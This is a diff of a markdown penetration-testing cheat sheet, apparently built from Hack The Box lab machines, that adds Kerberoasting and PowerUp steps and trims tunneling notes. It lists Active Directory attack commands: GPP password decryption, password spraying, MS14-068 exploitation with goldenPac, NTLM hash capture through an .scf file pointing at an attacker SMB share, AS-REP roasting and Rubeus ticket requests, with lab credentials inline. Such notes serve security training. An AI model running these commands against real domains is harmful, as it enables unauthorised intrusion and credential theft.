@@ -6,26 +6,25 @@ ctrl+z
 
 stty raw -echo;fg
 ```
+# Kerberos
+- Extract all accounts in the SPN.
 
-# Port Scanning with NetCat
+`setspn -T medin -Q ​ */* `
 
-```bash
-nc -zv <IP> 1-65535
-```
-# Internal Network access using Chisel (Reverse Connection):
-> Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
-- On the local machine:
-```bash
-./chisel server -p 8000 --reverse
-```
-- On target host:
-```bash
-./chisel client <LHOST>:8000 R:socks
-```
-# Internal Network access using SShuttle:
-```bash
-└─$ sudo sshuttle -r <username>@<RHOST> <Internal IP/Subnet>
-```
+-  Use [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1) and get a ticket.
+
+ `Invoke-Kerberoast -OutputFormat hashcat ​ |fl`
+
+##  Privilege Escalation
+
+- Use [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
+
+   ```powershell
+   . .\PowerUp.ps1
+  Invoke-AllChecks
+  ```
+
+
 # Find SUID bit.
 ```bash
 find / -perm -u=s -type f 2>/dev/null
@@ -63,13 +62,13 @@ rpcclient $> enumdomusers
 └─# smbclient -L ////10.10.10.175//
 ```
 
-# The Group Policy password is in encrypted format let's decrypt it:
+# The Group Policy password is in an encrypted format, decrypt it:
 ```bash
 └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
 ```
 
-# By login to smbclient we got user.txt:
+# login to smbclient:
 ```bash
 └─$ smbclient //10.10.10.100/Users -U svc_tgs
 Password for [WORKGROUP\svc_tgs]:
@@ -81,16 +80,16 @@ Password for [WORKGROUP\svc_tgs]:
 Password for [WORKGROUP\svc_tgs]:
 ```
 
-# Try to get info system using crackmapexec on smb:
+# crackmapexec on smb:
 ```bash
 └─$ crackmapexec smb 10.10.10.169 -u marco -p 'Welcome123!' --continue-on-success 
 ```
 
-# Let's do password spray using crackmapexec:
+# password spray using crackmapexec:
 ```bash
 └─$ crackmapexec smb 10.10.10.169 -u users -p Welcome123! --continue-on-success 
 ```
-# Run SharpHound binary on Target with collection method all:
+# SharpHound binary on Target with collection method all:
 ```bash
  .\SharpHound.exe -c All
  ```
@@ -126,12 +125,12 @@ PS C:\Users\sbauer\Documents> Get-ADUser jorden | Set-ADAccountControl -doesnotr
 $krb5asrep$23$jorden@MEGACORP:
 
 ```
-# Got login using Evil-winrm:
+# login using Evil-winrm:
 ```bash
 └─$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
 ```
 
-# Run cmd to get tgs of administrator:
+# Run cmd to get tgs:
 ```bash
 └─$ GetUserSPNs.py -request active.htb/SVC_TGS -dc-ip 10.10.10.100
 ```
@@ -201,23 +200,14 @@ OR
 # Kerbrute usernames:  
 ```bash
 root@kali# kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-
 ```
-
-
-# Using the exploit ms14-068 got vulnerability:
+# Using the exploit ms14-068:
 ```bash
 └─$ goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 HTB.LOCAL/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
 ```
 
 
-# Found write permissions in smbclient: Users/Public and ZZ_Archieve folder Upload a .scf file for capturing NTLM hash using responder:
+# Found write permissions in smbclient: Upload a .scf file for capturing NTLM hash using responder:
 ```bash
 ========make a file .scf==========
 └─$ cat file.scf 
@@ -225,27 +215,16 @@ root@kali# kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xa
 Command=2
 
 IconFile=\\10.10.14.4\icon          
-                          
-> Setup responder to capture hash:   
+```                          
+# Setup responder to capture hash: 
+```
 └─# responder -I tun0          
-
-> Upload file to the writeable folders
-smb: \Users\Public\> put file.scf 
-putting file file.scf as \Users\Public\file.scf (0.2 kb/s) (average 0.2 kb/s)
-
-
-got hash captured... If not works restart the machine.
 ```
 
 
 # Dumped LDAPdomain:
 ```bash
 └─# ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o /home/singhx/htb/sizzle/ldap
-[*] Connecting to host...
-[*] Binding to host
-[+] Bind OK
-[*] Starting domain dump
-[+] Domain dump finished
 
 └─# ls /home/singhx/htb/sizzle/ldap
 
@@ -271,16 +250,6 @@ domain_computers.grep        domain_computers.json  domain_groups.html  domain_p
 
  .\r.exe hash /password:Ashare1972
 
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v2.2.0
-
-
 [*] Action: Calculate Password Hash(es)
 
 [*] Input password             : Ashare1972
@@ -289,42 +258,15 @@ domain_computers.grep        domain_computers.json  domain_groups.html  domain_p
 
  .\r.exe asktgt /user:amanda /rc4:7D0516EA4B6ED084F3FDF71C47D9BEB3 /outfile:amanda-tgt
 
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v2.2.0
-
 [*] Action: Ask TGT
 
 
  .\r.exe asktgs /service:http/sizzle /ticket:amanda-tgt
 
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v2.2.0
-
 [*] Action: Ask TGS
 
 
  .\r.exe kerberoast /spn:http/sizzle /ticket:amanda-tgt /nowrap
-
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v2.2.0
 
 
 [*] Action: Kerberoasting
